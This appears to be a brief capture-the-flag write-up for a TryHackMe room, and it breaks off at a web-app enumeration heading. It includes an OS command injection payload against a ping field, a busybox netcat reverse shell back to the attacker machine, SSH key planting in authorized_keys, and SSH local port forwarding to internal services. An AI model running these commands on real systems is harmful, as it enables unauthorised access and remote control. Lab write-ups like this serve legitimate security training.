# URL
https://tryhackme.com/room/hh-infinitypool-5b3548af
# Concept
* OS command injection
* robots.txt
* network pivoting / local port forwarding
# Method of solve
## Starting Scans
* there are two ports open, `22` and `80`
* on the web app's `robots.txt` file, there are references to two endpoints:
  * `/internal` and `/status`
## Initial Access
* on the `/status` endpoint there is a ping functionality built into the page:
  * this user field is vulnerable to `OS command injection`
    * this payload will confirm the vulnerability:
    * `192.168.134.186; whoami #`
  * we can use this payload to establish a reverse shell connection to the attacker machine:
  * `busybox nc 192.168.134.186 443 -e /bin/bash`
## Privilege Escalation
### Local Port Forwarding Setup
* we will need to access a few locally-hosted webpages, so we're going to do local port forwarding to allow us to view the webpages on our web browser
1) Copy the contents of our attacker machine's `id_rsa.pub` file to the remote machine's `authorized_keys` file in the `web` user's `.ssh` directory
2) Get a list of listening ports: `ss -tulpn` (the ports we're interested in are 3000, 5038, 9000, 8089, 8088, and 8080)
3) Use SSH to setup a local port forward for each of those ports:
```
ssh -i ./id_rsa -N -L 3000:127.0.0.1:3000 -L 5038:127.0.0.1:5038 -L 9000:127.0.0.1:9000 -L 8080:127.0.0.1:8080 -L 8088:127.0.0.1:8088 -L 8089:127.0.0.1:8089 web@10.144.173.198
```
### Enumerating the web apps
